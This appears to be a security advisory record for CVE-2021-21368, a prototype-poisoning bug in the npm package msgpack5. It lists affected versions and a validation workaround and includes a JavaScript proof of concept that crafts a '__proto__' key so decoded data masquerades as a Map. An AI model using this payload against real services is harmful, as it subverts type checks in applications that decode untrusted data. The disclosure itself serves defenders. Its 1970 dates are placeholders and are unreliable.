---
- id: npmjs:npm:msgpack5:1651
  title: Prototype Poisoning
  description: "### Impact\n\nWhen `msgpack5` decodes a map containing a  key `\"__proto__\"`,
    it assigns the decoded value to `__proto__`. As you  are no doubt aware, `Object.prototype.__proto__`
    is an accessor  property for the receiver's prototype. If the value corresponding
    to the key `__proto__` decodes to an object or `null`, `msgpack5` sets  the decoded
    object's prototype to that value. \n\nAn attacker who can submit crafted MessagePack
    data to a service can use this to produce values that appear to be of other types;
    may have unexpected prototype properties and methods (for example `length`, numeric
    properties, and `push` et al if `__proto__`'s value decodes to an `Array`); and/or
    may throw unexpected exceptions when used (for example if the `__proto__` value
    decodes to a `Map` or `Date`). Other unexpected behavior might be produced for
    other types. \n\nThere is no effect on the global prototype.\n\nAn example: \n\n```js
    \nconst msgpack5 = require('msgpack5')(); \n\nconst payload = {}; \nObject.defineProperty(payload,
    '__proto__', { \nvalue: new Map().set(1, 2), \nenumerable: true \n}); \n\nconst
    encoded = msgpack5.encode(payload); \nconsole.log(encoded); // <Buffer 81 a9 5f
    5f 70 72 6f 74 6f 5f 5f 81 01 02> \n\nconst decoded = msgpack5.decode(encoded);
    \n\n// decoded's prototype has been overwritten \nconsole.log(Object.getPrototypeOf(decoded));
    // Map(1) { 1 => 2 } \nconsole.log(decoded.get); // [Function: get] \n\n// decoded
    appears to most common typechecks to be a Map \nconsole.log(decoded instanceof
    Map); // true \nconsole.log(decoded.toString()); // [object Map] \nconsole.log(Object.prototype.toString.call(decoded));
    // [object Map] \nconsole.log(decoded.constructor.name); // Map \nconsole.log(Object.getPrototypeOf(decoded).constructor.name);
    // Map \n\n// decoded is not, however, a Map \nconsole.log(Object.getPrototypeOf(decoded)
    === Map.prototype); // false \n\n// using decoded as though it were a Map throws
    \ntry { \ndecoded.get(1); \n} catch (error) { \nconsole.log(error); // TypeError:
    Method Map.prototype.get called \n// on incompatible receiver #<Map> \n} \ntry
    { \ndecoded.size; \n} catch (error) { \nconsole.log(error); // TypeError: Method
    get Map.prototype.size \n// called on incompatible receiver #<Map> \n} \n\n//
    re-encoding the decoded value throws \ntry { \nmsgpack5.encode(decoded); \n} catch
    (error) { \nconsole.log(error); // TypeError: Method Map.prototype.entries \n//
    called on incompatible receiver #<Map> \n} \n``` \n\nThis \"prototype poisoning\"
    is sort of a very limited inversion of a \nprototype pollution attack. Only the
    decoded value's prototype is \naffected, and it can only be set to `msgpack5`
    values (though if the \nvictim makes use of custom codecs, anything could be a
    `msgpack5` \nvalue). We have not found a way to escalate this to true prototype
    \npollution (absent other bugs in the consumer's code). \n\n### Workarounds\n\nAlways
    validate incoming data after parsing before doing any processing."
  affected_package: msgpack5
  vulnerable_versions:
  - "<3.6.1"
  - ">=4.0.0 <4.5.1"
  - ">=5.0.0 <5.2.1"
  severity: medium
  package_manager: npm
  cve:
  - CVE-2021-21368
  cwe: CWE-915
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Anonymous
